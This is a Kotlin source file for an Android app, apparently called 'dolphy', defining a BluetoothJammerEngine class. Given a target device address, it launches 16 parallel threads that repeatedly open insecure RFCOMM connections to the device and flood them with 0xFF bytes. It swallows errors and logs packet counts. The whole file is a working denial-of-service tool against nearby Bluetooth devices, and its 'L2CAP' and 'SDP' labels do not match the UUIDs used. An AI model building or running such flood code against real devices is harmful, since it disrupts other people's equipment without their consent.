package com.droid.dolphy

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import java.io.IOException
import java.util.*

class BluetoothJammerEngine(private val context: Context) {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var attackJob: Job? = null
    private var isRunning = false

    private val l2capUuid = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
    private val sdpUuid = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")

    fun startJamming(targetAddress: String, onLog: (String) -> Unit) {
        if (isRunning) return
        isRunning = true

        attackJob = scope.launch {
            onLog("Initializing high-power jammer...")
            val adapter = BluetoothAdapter.getDefaultAdapter()
            if (adapter == null) {
                onLog("Error: Bluetooth adapter not found")
                isRunning = false
                return@launch
            }

            adapter.cancelDiscovery()
            val device = adapter.getRemoteDevice(targetAddress)

            val threadCount = 16
            onLog("Starting $threadCount parallel flood threads...")

            val jobs = mutableListOf<Job>()
            for (i in 1..threadCount) {
                jobs.add(launch {
                    while (isActive && isRunning) {
                        try {
                            floodDevice(device, i, onLog)
                        } catch (e: Exception) {

                        }
                        delay(50)
                    }
                })
            }

            jobs.forEach { it.join() }
        }
    }

    fun stopJamming() {
        isRunning = false
        attackJob?.cancel()
        attackJob = null
    }

    @SuppressLint("MissingPermission")
    private suspend fun floodDevice(device: BluetoothDevice, threadId: Int, onLog: (String) -> Unit) {
        var socket: BluetoothSocket? = null
        try {

            val useSdp = Random().nextBoolean()
            socket = if (useSdp) {
                device.createInsecureRfcommSocketToServiceRecord(sdpUuid)
            } else {
                device.createInsecureRfcommSocketToServiceRecord(l2capUuid)
            }

            socket.connect()

            if (socket.isConnected) {
                withContext(Dispatchers.Main) {
                    onLog("T$threadId: Connected (${if (useSdp) "SDP" else "L2CAP"})! Flooding...")
                }
                val outputStream = socket.outputStream
                val buffer = ByteArray(1024) { 0xFF.toByte() }

                var packets = 0
                while (isRunning && socket.isConnected) {
                    outputStream.write(buffer)
                    packets++
                    if (packets % 50 == 0) {
                        withContext(Dispatchers.Main) {
                            onLog("T$threadId: Sent $packets packets (${if (useSdp) "SDP" else "L2CAP"})")
                        }
                    }
                    yield()
                }
            }
        } catch (e: IOException) {

        } finally {
            try { socket?.close() } catch (e: Exception) {}
        }
    }

    fun isRunning(): Boolean = isRunning
}

